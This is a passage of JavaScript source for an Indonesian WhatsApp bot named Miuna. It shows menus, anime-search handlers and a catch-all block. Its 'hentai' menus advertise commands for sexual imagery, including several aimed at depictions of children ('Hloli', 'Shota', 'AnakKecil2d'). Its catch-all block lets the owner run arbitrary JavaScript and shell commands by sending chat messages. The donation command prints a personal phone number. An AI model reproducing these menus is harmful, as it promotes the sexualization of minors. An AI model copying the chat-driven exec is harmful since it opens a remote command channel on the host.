│✑ ${prefix}ᴛᴏɢɪғ [ᴋɪʀɪᴍ]
│
│✑✑✑❀ ᴡɪʙᴜ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴀɴɪᴍᴇ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴀɴɪᴍᴇᴏɴɢᴏɪɴɢ
│✑ ${prefix}ᴀɴɪᴍᴇǫᴜᴏᴛᴇ
│✑ ${prefix}ᴀᴡᴏᴏ
│✑ ${prefix}ᴄʀᴏsᴘʟᴀʏ
│✑ ${prefix}ғᴏxɢɪʀʟ
│✑ ${prefix}ɢᴀᴄʜᴀᴡᴀɪғᴜ
│✑ ${prefix}ɢᴜʀᴀsᴛɪᴄᴋᴇʀ
│✑ ${prefix}ᴋᴜsᴏɴɪᴍᴇ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ʟᴏʟɪ
│✑ ${prefix}ᴍᴀɴɢᴀ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴍᴇɢᴜᴍɪɴ
│✑ ${prefix}ɴʜᴇɴᴛᴀɪ [ᴋᴏᴅᴇ]
│✑ ${prefix}ɴᴇᴋᴏ
│✑ ${prefix}ᴏᴛᴀᴋᴜᴅᴇsᴜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴘᴘᴄᴏᴜᴘʟᴇ
│✑ ${prefix}ǫᴜᴏᴛᴇsᴀɴɪᴍᴇ
│✑ ${prefix}sᴄᴀɴɪᴍᴇ
│✑ ${prefix}ᴡᴀɪғᴜ [ᴛᴇxᴛ]
│✑ ${prefix}ᴡᴀʟʟᴘᴀᴘᴇʀ
│
│✑✑✑❀ ᴍᴇɴᴜ ʟᴀɪɴɴʏᴀ ❀
│
│✑ ${prefix}ᴄᴏᴠɪᴅ
│✑ ${prefix}ᴄʜᴀɴɢᴇʟᴏɢ
│✑ ${prefix}ғʟɪᴘᴛᴇxᴛ [ᴛᴇxᴛ]
│✑ ${prefix}ɢᴏᴏɢʟᴇ [ᴛᴇxᴛ]
│✑ ${prefix}ɢɪᴍᴀɢᴇ [ᴛᴇxᴛ]
│✑ ${prefix}ɢᴇᴍᴘᴀ
│✑ ${prefix}ʀᴇᴘᴏʀᴛ [ᴛᴇxᴛ]
│✑ ${prefix}ᴛʀᴀɴsʟᴀᴛᴇ
│✑ ${prefix}ᴛᴏʟᴇᴛᴛᴇʀ [ᴛᴇxᴛ]
│✑ ${prefix}ᴡɪᴋɪ [ᴛᴇxᴛ]
│
│✑✑✑❀ ʜᴇɴᴛᴀɪ ᴍᴇɴᴜ❀
│   
│✑ ${prefix}ʜᴇɴᴛᴀɪᴍᴇɴᴜ
│✑ ${prefix}ʜᴇɴᴛᴀɪᴍᴇɴᴜᴠ𝟸
│
│✑ ᴊᴀɴɢᴀɴ sɪsᴘᴀᴍ ʏᴀ ᴏɴɪɪᴄʜᴀɴ!
│  
│        『  *${global.BotName}*  』
│✑ ʀᴇᴄᴏᴅᴇ : ʀɪ
│✑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙᴏᴛ : ғᴀɴᴛᴏx
╰────────────────⊱
`
let buttonclog =  [
    {buttonId: `-clog`, buttonText: {displayText: 'ᴄʜᴀɴɢᴇʟᴏɢ!'}, type: 1},
    {buttonId: `-donatur`, buttonText: {displayText: 'ᴅᴏɴᴀᴛᴜʀ'}, type: 1}
    ]
let buttonMessage = {
	image:fs.readFileSync('./Assets/miunaa.jpg'),
	caption : text,
	buttons : buttonclog,
    footer : 'Miuna',
    headerType : 4,
	}
Miku.sendMessage(q, buttonMessage)
m.reply (`Sudah saya kirimkan list menunya di chat pribadi kak!`)
}

	break



		case 'hentaimenu': case 'hlist': case 'hentailist':{
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
      
 const hentailist = `
╭────❲ *🔞Hentai Menu🔞* ❳
│
│  ╰≻ ${prefix}Ass *Baru*
│  ╰≻ ${prefix}Bdsm *Baru* 
│  ╰≻ ${prefix}Blowjob *Baru*
│  ╰≻ ${prefix}Colmek
│  ╰≻ ${prefix}Cum *Baru* 
│  ╰≻ ${prefix}Cumclut *Baru*
│  ╰≻ ${prefix}Cuckold *Baru*
│  ╰≻ ${prefix}Feet *Baru*
│  ╰≻ ${prefix}Genshinimpact
│  ╰≻ ${prefix}Gasm
│  ╰≻ ${prefix}Gangbang *Baru*
│  ╰≻ ${prefix}Glasses *Baru*
│  ╰≻ ${prefix}Hloli 
│  ╰≻ ${prefix}Hwaifu
│  ╰≻ ${prefix}Hentaivideo
│  ╰≻ ${prefix}Hneko
│  ╰≻ ${prefix}Hmiku
│  ╰≻ ${prefix}Ikku
│  ╰≻ ${prefix}Memew
│  ╰≻ ${prefix}Maid *Baru*
│  ╰≻ ${prefix}Masturbation *Baru*
│  ╰≻ ${prefix}Mstrb *Baru*
│  ╰≻ ${prefix}Nyepong
│  ╰≻ ${prefix}Netorare *Baru*  
│  ╰≻ ${prefix}Oppai
│  ╰≻ ${prefix}Orgy *Baru* 
│  ╰≻ ${prefix}Pantat
│  ╰≻ ${prefix}Pantsu
│  ╰≻ ${prefix}Pussy *Baru*
│  ╰≻ ${prefix}Panties *Baru*
│  ╰≻ ${prefix}Spank
│  ╰≻ ${prefix}School *Baru*
│  ╰≻ ${prefix}Tentacles *Baru*
│  ╰≻ ${prefix}Tusbol
│  ╰≻ ${prefix}Trap
│  ╰≻ ${prefix}Thighs *Baru*
│  ╰≻ ${prefix}Yuri *Baru*     
│
│>>『  *${global.BotName}*  』<<
│
╰─────────────────⊱
`
    

 let buttonsclogm = [
    {buttonId: `-donasi`, buttonText: {displayText: 'Req Genre? Donet dlu bang:v'}, type: 1}
    ]
                let buttonMessage = {
                    image:fs.readFileSync('./Assets/Hentailist.png'),
                    caption: hentailist,
                    footer: `${BotName}`,
                    buttons: buttonsclogm,
                    headerType: 4
                    
                }
            Miku.sendMessage(m.chat, buttonMessage,{ quoted:m })
                }
	break
	
	case 'hentaimenuv2': case 'hmv2':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    reply(`
╭──❲ Hai Kak *${pushname}* ❳
│
│  ╰≻ ${prefix}AnimeThighss
│  ╰≻ ${prefix}AnimeBooty
│  ╰≻ ${prefix}AnimeFeets
│  ╰≻ ${prefix}Ahegao
│  ╰≻ ${prefix}BigAnimeTiddies
│  ╰≻ ${prefix}HentaiParadise
│  ╰≻ ${prefix}Hentai4Everyone
│  ╰≻ ${prefix}LewdAnimeGirls
│  ╰≻ ${prefix}SideOppai
│  ╰≻ ${prefix}Shota
│  ╰≻ ${prefix}Slurp (Blowjob)
│  ╰≻ ${prefix}Ecchi
│  ╰≻ ${prefix}Pantat2d
│  ╰≻ ${prefix}Ketec
│  ╰≻ ${prefix}ChiisaiHentai
│  ╰≻ ${prefix}Crot
│  ╰≻ ${prefix}YuriMesum
│  ╰≻ ${prefix}AnakKecil2d
│  ╰≻ ${prefix}Femdom
│  ╰≻ ${prefix}FetishKaki
│  ╰≻ ${prefix}Hololewd
│  ╰≻ ${prefix}Liwed
│  ╰≻ ${prefix}Milfu
│  ╰≻ ${prefix}Nun
│  ╰≻ ${prefix}Holoero
│  ╰≻ ${prefix}Hentay
│  ╰≻ ${prefix}AnimeThighss
│  ╰≻ ${prefix}SpyXFamily
│  ╰≻ ${prefix}Eleina
│  ╰≻ ${prefix}Kanna
│  ╰≻ ${prefix}Lycoris
│  ╰≻ ${prefix}Sagiri
│
│>>『  *${global.BotName}*  』<<
│
╰─────────────────⊱
`)
                
	break
	
	
	case 'otakudesu':{
	 if (!isMod) return reply(mess.mod)
     if (isBan) return reply(mess.ban)	 
     if (isBanChat) return reply(mess.banChat)
     if (!args.join(" ")) return reply(`Emm, Judulnya?`)
     reply (`Chotto matte ne...`)
                   ri = await fetchJson (`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${args.join(" ")}`)
judul = ri.result.title
tipe = ri.result.type
const ep = ri.result.episodes
rilis = ri.result.aired
pro = ri.result.producers
genre = ri.result.genres
dura = ri.result.duration
const rat = ri.result.rating
ep1360 = ri.result.link_dl[0].link_dl[0].link_dl["ZippyShare"]
ep1480 = ri.result.link_dl[0].link_dl[1].link_dl["ZippyShare"]
ep1720 = ri.result.link_dl[0].link_dl[2].link_dl["ZippyShare"]
const ep2360 = ri.result.link_dl[1].link_dl[0].link_dl["ZippyShare"]
ep2480 = ri.result.link_dl[1].link_dl[1].link_dl["ZippyShare"]
ep2720 = ri.result.link_dl[1].link_dl[2].link_dl["ZippyShare"]
const ep3360 = ri.result.link_dl[2].link_dl[0].link_dl["ZippyShare"]
ep3480 = ri.result.link_dl[2].link_dl[1].link_dl["ZippyShare"]
ep3720 = ri.result.link_dl[2].link_dl[2].link_dl["ZippyShare"]
const ep4360 = ri.result.link_dl[3].link_dl[0].link_dl["ZippyShare"]
ep4480 = ri.result.link_dl[3].link_dl[1].link_dl["ZippyShare"]
ep4720 = ri.result.link_dl[3].link_dl[2].link_dl["ZippyShare"]
const ep5360 = ri.result.link_dl[4].link_dl[0].link_dl["ZippyShare"]
ep5480 = ri.result.link_dl[4].link_dl[1].link_dl["ZippyShare"]
ep5720 = ri.result.link_dl[4].link_dl[2].link_dl["ZippyShare"]
const ep6360 = ri.result.link_dl[5].link_dl[0].link_dl["ZippyShare"]
ep6480 = ri.result.link_dl[5].link_dl[1].link_dl["ZippyShare"]
ep6720 = ri.result.link_dl[5].link_dl[2].link_dl["ZippyShare"]
const ep7360 = ri.result.link_dl[6].link_dl[0].link_dl["ZippyShare"]
ep7480 = ri.result.link_dl[6].link_dl[1].link_dl["ZippyShare"]
ep7720 = ri.result.link_dl[6].link_dl[2].link_dl["ZippyShare"]
const ep8360 = ri.result.link_dl[7].link_dl[0].link_dl["ZippyShare"]
ep8480 = ri.result.link_dl[7].link_dl[1].link_dl["ZippyShare"]
ep8720 = ri.result.link_dl[7].link_dl[2].link_dl["ZippyShare"]
const ep9360 = ri.result.link_dl[8].link_dl[0].link_dl["ZippyShare"]
ep9480 = ri.result.link_dl[8].link_dl[1].link_dl["ZippyShare"]
ep9720 = ri.result.link_dl[8].link_dl[2].link_dl["ZippyShare"]
const ep10360 = ri.result.link_dl[9].link_dl[0].link_dl["ZippyShare"]
ep10480 = ri.result.link_dl[9].link_dl[1].link_dl["ZippyShare"]
ep10720 = ri.result.link_dl[9].link_dl[2].link_dl["ZippyShare"]
const ep11360 = ri.result.link_dl[10].link_dl[0].link_dl["ZippyShare"]
ep11480 = ri.result.link_dl[10].link_dl[1].link_dl["ZippyShare"]
ep11720 = ri.result.link_dl[10].link_dl[2].link_dl["ZippyShare"]
const ep12360 = ri.result.link_dl[11].link_dl[0].link_dl["ZippyShare"]
ep12480 = ri.result.link_dl[11].link_dl[1].link_dl["ZippyShare"]
ep12720 = ri.result.link_dl[11].link_dl[2].link_dl["ZippyShare"]
const ep13360 = ri.result.link_dl[12].link_dl[0].link_dl["OtakuDrive"]
ep13480 = ri.result.link_dl[12].link_dl[1].link_dl["OtakuDrive"]
ep13720 = ri.result.link_dl[12].link_dl[2].link_dl["OtakuDrive"]
let teks = `Episode 1
360P : ${ep1360}

480P : ${ep1480}

720P : ${ep1720}`
let teks2 = `Episode 2
360P : ${ep2360}

480P : ${ep2480}

720P : ${ep2720}`
let teks3 = `Episode 3
360P : ${ep3360}

480P : ${ep3480}

720P : ${ep3720}`
let teks4 = `Episode 4
360P : ${ep4360}

480P : ${ep4480}

720P : ${ep4720}`
let teks5 = `Episode 5
360P : ${ep5360}

480P : ${ep5480}

720P : ${ep5720}`
let teks6 = `Episode 6
360P : ${ep6360}

480P : ${ep6480}

720P : ${ep6720}`
let teks7 = `Episode 7
360P : ${ep7360}

480P : ${ep7480}

720P : ${ep7720}`
let teks8 = `Episode 8
360P : ${ep8360}

480P : ${ep8480}

720P : ${ep8720}`
let teks9 = `Episode 9
360P : ${ep9360}

480P : ${ep9480}

720P : ${ep9720}`
let teks10 = `Episode 10
360P : ${ep10360}

480P : ${ep10480}

720P : ${ep10720}`
let teks11 = `Episode 11
360P : ${ep11360}

480P : ${ep11480}

720P : ${ep11720}`
let teks12 = `Episode 12
360P : ${ep12360}

480P : ${ep12480}

720P : ${ep12720}`
let teks13 = `Batch
360P : ${ep13360}

480P : ${ep13480}

720P : ${ep13720}`
let sections = []
const yy = {title : `Otakudesu By Miuna`,
rows: [
{title: `Episode 1`, rowId: `-otsu ${teks}`},
{title: `Episode 2`, rowId: `-otsu ${teks2}`},
{title: `Episode 3`, rowId: `-otsu ${teks3}`},
{title: `Episode 4`, rowId: `-otsu ${teks4}`},
{title: `Episode 5`, rowId: `-otsu ${teks5}`},
{title: `Episode 6`, rowId: `-otsu ${teks6}`},
{title: `Episode 7`, rowId: `-otsu ${teks7}`},
{title: `Episode 8`, rowId: `-otsu ${teks8}`},
{title: `Episode 9`, rowId: `-otsu ${teks9}`},
{title: `Episode 10`, rowId: `-otsu ${teks10}`},
{title: `Episode 11`, rowId: `-otsu ${teks11}`},
{title: `Episode 12`, rowId: `-otsu ${teks12}`},
{title: `Batch`, rowId: `-otsu ${teks13}`}
                    ]
                   }
sections.push(yy)
                   
                    const sendm =  Miku.sendMessage(
      from, { text: `Judul : ${judul}\n\nTipe : ${tipe}\n\nJumlah Episode : ${ep}\n\nTanggal Rilis : ${rilis}\n\nDurasi Per Episode : ${dura}\n\nProduser : ${pro}\n\nRating : ${rat}\n\nGenre : ${genre}`, buttonText: "List Episode",sections
      })  
}
  break
	
case 'otsu':{
if (!isMod) return reply (mess.mod)
reply(args.join(" "))
}
break	
case 'animeongoing': case 'aog':{
if (!isMod) return reply (mess.mod)
ri = await fetchJson (`https://api.lolhuman.xyz/api/neonimelatest?apikey=${lolkey}`)
const title1 = ri.result[0].title
link1 = ri.result[0].link
thum1 = ri.result[0].thumbnail
tang1 = ri.result[0].date
const desk1 = ri.result[0].desc
ep1 = ri.result[0].episode
const title2 = ri.result[1].title
link2 = ri.result[1].link
thum2 = ri.result[1].thumbnail
tang2 = ri.result[1].date
const desk2 = ri.result[1].desc
ep2 = ri.result[1].episode
const title3 = ri.result[2].title
link3 = ri.result[2].link
thum3 = ri.result[2].thumbnail
tang3 = ri.result[2].date
const desk3 = ri.result[2].desc
ep3 = ri.result[2].episode
const title4 = ri.result[3].title
link4 = ri.result[3].link
thum4 = ri.result[3].thumbnail
tang4 = ri.result[3].date
const desk4 = ri.result[3].desc
ep4 = ri.result[3].episode
const title5 = ri.result[4].title
link5 = ri.result[4].link
thum5 = ri.result[4].thumbnail
tang5 = ri.result[4].date
const desk5 = ri.result[4].desc
ep5 = ri.result[4].episode
const title6 = ri.result[5].title
link6 = ri.result[5].link
thum6 = ri.result[5].thumbnail
tang6 = ri.result[5].date
const desk6 = ri.result[5].desc
ep6 = ri.result[5].episode
const title7 = ri.result[6].title
link7 = ri.result[6].link
thum7 = ri.result[6].thumbnail
tang7 = ri.result[6].date
const desk7 = ri.result[6].desc
ep7 = ri.result[6].episode
const title8 = ri.result[7].title
link8 = ri.result[7].link
thum8 = ri.result[7].thumbnail
tang8 = ri.result[7].date
const desk8 = ri.result[7].desc
ep8 = ri.result[7].episode
const title9 = ri.result[8].title
link9 = ri.result[8].link
thum9 = ri.result[8].thumbnail
tang9 = ri.result[8].date
const desk9 = ri.result[8].desc
ep9 = ri.result[8].episode
const title10 = ri.result[9].title
link10 = ri.result[9].link
thum10 = ri.result[9].thumbnail
tang10 = ri.result[9].date
const desk10 = ri.result[9].desc
ep10 = ri.result[9].episode
const title11 = ri.result[10].title
link11 = ri.result[10].link
thum11 = ri.result[10].thumbnail
tang11 = ri.result[10].date
const desk11 = ri.result[10].desc
ep11 = ri.result[10].episode
const title12 = ri.result[11].title
link12 = ri.result[11].link
thum12 = ri.result[11].thumbnail
tang12 = ri.result[11].date
const desk12 = ri.result[11].desc
ep12 = ri.result[11].episode
const title13 = ri.result[12].title
link13 = ri.result[12].link
thum13 = ri.result[12].thumbnail
tang13 = ri.result[12].date
const desk13 = ri.result[12].desc
ep13 = ri.result[12].episode
const title14 = ri.result[13].title
link14 = ri.result[13].link
thum14 = ri.result[13].thumbnail
tang14 = ri.result[13].date
const desk14 = ri.result[13].desc
ep14 = ri.result[13].episode
let sections = []
const yy = {title : `Anime On Going`,
rows: [
{title: `${title1}`, rowId: `-mir Streaming : ${link1}\n\nTanggal Rilis : ${tang1}\n\nDeskripsi : ${desk1}|${thum1}`, description : `${ep1}`},
{title: `${title2}`, rowId: `-mir Streaming : ${link2}\n\nTanggal Rilis : ${tang2}\n\nDeskripsi : ${desk2}|${thum2}`, description : `${ep2}`},
{title: `${title3}`, rowId: `-mir Streaming : ${link3}\n\nTanggal Rilis : ${tang3}\n\nDeskripsi : ${desk3}|${thum3}`, description : `${ep3}`},
{title: `${title4}`, rowId: `-mir Streaming : ${link4}\n\nTanggal Rilis : ${tang4}\n\nDeskripsi : ${desk4}|${thum4}`, description : `${ep4}`},
{title: `${title5}`, rowId: `-mir Streaming : ${link5}\n\nTanggal Rilis : ${tang5}\n\nDeskripsi : ${desk5}|${thum5}`, description : `${ep5}`},
{title: `${title6}`, rowId: `-mir Streaming : ${link6}\n\nTanggal Rilis : ${tang6}\n\nDeskripsi : ${desk6}|${thum6}`, description : `${ep6}`},
{title: `${title7}`, rowId: `-mir Streaming : ${link7}\n\nTanggal Rilis : ${tang7}\n\nDeskripsi : ${desk7}|${thum7}`, description : `${ep7}`},
{title: `${title8}`, rowId: `-mir Streaming : ${link8}\n\nTanggal Rilis : ${tang8}\n\nDeskripsi : ${desk8}|${thum8}`, description : `${ep8}`},
{title: `${title9}`, rowId: `-mir Streaming : ${link9}\n\nTanggal Rilis : ${tang9}\n\nDeskripsi : ${desk9}|${thum9}`, description : `${ep9}`},
{title: `${title10}`, rowId: `-mir Streaming : ${link10}\n\nTanggal Rilis : ${tang10}\n\nDeskripsi : ${desk10}|${thum10}`, description : `${ep10}`},
{title: `${title11}`, rowId: `-mir Streaming : ${link11}\n\nTanggal Rilis : ${tang11}\n\nDeskripsi : ${desk11}|${thum11}`, description : `${ep11}`},
{title: `${title12}`, rowId: `-mir Streaming : ${link12}\n\nTanggal Rilis : ${tang12}\n\nDeskripsi : ${desk12}|${thum12}`, description : `${ep12}`},
{title: `${title13}`, rowId: `-mir Streaming : ${link13}\n\nTanggal Rilis : ${tang13}\n\nDeskripsi : ${desk13}|${thum13}`, description : `${ep13}`},
{title: `${title14}`, rowId: `-mir Streaming : ${link14}\n\nTanggal Rilis : ${tang14}\n\nDeskripsi : ${desk14}|${thum14}`, description : `${ep14}`}
]}
sections.push(yy)

const sendm = Miku.sendMessage(from, {text : `Anime On Going By : Miuna`, buttonText : "Lihat List Disini!" , sections})
}
break
case 'mir':{
if (!isMod) return reply (mess.mod)
let teks = q.split('|')[0] ? q.split('|')[0] : q
let thumb = q.split('|')[1] ? q.split('|')[1] : q
let buttonMessage ={
image : {url : thumb},
caption : `${teks}`,
headerType : 1
}
Miku.sendMessage(from, buttonMessage,{quoted : m})
}
break
case 'donasi':
        reply(`Ovo/Dana/Gopay : 085161888973\n Saya akan sangat terbantu jika anda memberi sedikit uang kepada saya. Terima kasih 🙏 `)
    break		
case 'testbut':{
let sections = []
const yy = {title : `Anime On Going`,
rows: [
{title: `ngen`, rowId: `-mir Streaming : `, description : `Ngen`},
{title: `ngen`, rowId: `-mir Streaming : `, description : `Ngen`}
]}
sections.push(yy)
let buttonMessage = {
document: fs.readFileSync('./Rimed/Ri.xlsx'),
mimetype: docs,
fileName: `Anime On Going`,
fileLength: 99999999999999,
caption : 'List Anime dibawah ini Berdasarkan Web Neonime!',
footer : 'Miuna', 
ButtonText : 'Lihat List!',
sections
}
Miku.sendMessage(m.chat, buttonMessage)
}	

default:

   /* if(isCmd){
        if (isBan) return reply(mess.banned)	 			
        if (isBanChat) return reply(mess.bangc)
        reply (`Tidak ada perintah seperti itu *${pushname}* senpai! Ketik *${prefix}help* untuk melihat semua perintah!`)

    }	*/ 			


if (budy.startsWith('=>')) {
if (!isCreator) return reply(mess.botowner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
Miku.sendMessage(from, {image:ErrorPic, caption:String(e)}, {quoted:m})
}
}
if (budy.startsWith('>')) {
if (!isCreator) return reply(mess.botowner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await Miku.sendMessage(from, {image:ErrorPic, caption:String(err)}, {quoted:m})
}
}


                
if (budy.startsWith('$')) {
if (!isCreator) return replay(mess.botowner)
exec(budy.slice(2), (err, stdout) => {
if(err) return Miku.sendMessage(from, {image:ErrorPic, caption:String(err)}, {quoted:m})
if (stdout) return replay(stdout)
})
}


if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Miku.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}
}catch (err) {
Miku.sendMessage(`${ownertag}@s.whatsapp.net`, util.format(err), {quoted:m})
console.log(err)
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
